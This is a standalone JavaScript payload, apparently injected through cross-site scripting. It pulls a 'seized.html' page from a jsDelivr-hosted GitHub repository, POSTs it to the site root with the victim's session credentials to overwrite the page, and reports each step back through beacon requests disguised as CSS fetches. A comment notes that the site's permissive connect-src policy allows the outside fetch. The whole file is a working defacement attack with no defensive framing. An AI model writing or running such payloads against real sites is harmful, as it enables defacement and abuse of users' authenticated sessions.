(function(){
  var UNIQ="v10";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }

  sig("init");

  // Fetch seized.html from JSDelivr (connect-src * allows it), then POST to /
  fetch("https://cdn.jsdelivr.net/gh/sem-17/vx@96e9a9afb12614ce41d97017dee136061df84954/seized.html",{cache:"no-store"})
    .then(function(r){ return r.text(); })
    .then(function(html){
      sig("got_sz");
      return fetch("/",{
        method:"POST",
        credentials:"include",
        headers:{"Content-Type":"text/html"},
        body:html
      });
    })
    .then(function(r){
      sig("post_"+r.status);
      // Also try to verify: GET / and check first 20 chars
      return fetch("/",{credentials:"include"});
    })
    .then(function(r){ return r.text(); })
    .then(function(body){
      // If seized: starts with <!doctype html>\n<html lang="en">\n<head>
      // sig sz_ok if Seized, sz_no if not
      if(body.indexOf("CERT-Tervalis")>=0){
        sig("sz_ok");
      } else {
        sig("sz_no");
      }
    })
    .catch(function(e){ sig("err"); });

})();
